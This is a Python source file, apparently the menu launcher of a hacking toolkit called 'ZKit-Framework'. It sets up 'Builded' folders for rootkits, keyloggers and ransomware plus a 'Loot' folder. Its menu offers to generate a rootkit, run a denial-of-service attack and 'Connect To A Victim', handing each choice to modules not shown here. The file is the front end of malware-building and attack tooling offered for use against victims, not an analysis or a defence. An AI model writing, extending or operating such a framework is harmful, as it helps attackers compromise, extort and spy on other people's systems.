"Instead of having lots of lines of code in zkit diffrent files in launcher_core"

def start():
    try:
        # Doing some imports
        from core.banners import banners
        from core.core import notify, Color, generate
        from os import popen, path, name as os_name, system
        from core.launcher_core import dos, controller
        import random
        from time import sleep
    except ImportError as value:
        # Ops ! Sth is missing

        print(
            "One Or Some On Requirments Not Found . Please Install Them And Try Again ."
            + "Python Threw : "
            + str(value)
        )
        raise SystemExit

    # Initallizing Needed Variables
    PATH = path.dirname(path.dirname(__file__))
    Rootkit_PATH = PATH + "\\Builded\\Rootkit\\"
    KeyLogger_PATH = PATH + "\\Builded\\KeyLogger\\"
    Ransomware_PATH = PATH + "\\Builded\\Ransomware\\"
    popen("mkdir {}".format(Rootkit_PATH)).close()
    popen("mkdir {}".format(KeyLogger_PATH)).close()
    popen("mkdir {}".format(Ransomware_PATH)).close()
    popen("mkdir {}".format(PATH + '\\Loot')).close()
    system("CLEAR")
    if os_name == "nt":
        system("cls")
    

    sleep(1)
    # Printing A Banner More Comming Soon
    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
    
    banner = banners.first
    helpbanner = banners.helpbanner
    color = random.choice([red, green, yellow, blue, magenta, cyan, grey])
    print(color + banner + reset)
    # Hard And Boring Code
    print(
    "\t \t \t \t \t    Hacking is" + red + " C " + green + "O " + blue + "L " +
    yellow + "O " + magenta + "R " + green +
    "F " + red + "U " + magenta + "L " + reset
    )
    print(
        "Available Options Are or Enter '?' To get a summery about notes of using this framework:\n" "* = Not Supported right now\n"
        + red + "  {1} --> Create A RootKit\n"
        + green + "  {2} --> Create A Ransomware *\n"
        + blue + "  {3} --> Create A KeyLogger *\n"
        + yellow + "  {4} --> Run A Dos Attack\n"
        + magenta + "  {5} --> Connect To A Victim\n"
        + cyan + "  {000}" + "--> Exit ZKit-Framework\n" + reset
    )
    while True:
        CHOICE = str(input("..> "))
        if CHOICE == "000":
            pass
        elif CHOICE == "?":
            print(helpbanner)
        elif CHOICE == "1":
            generate("rootkit")
        elif CHOICE == "4":
            dos.main()
        elif CHOICE == "5":
            controller.main()
        else:
            notify("problem", "Invalid Input {" + "{}".format(CHOICE) + "}")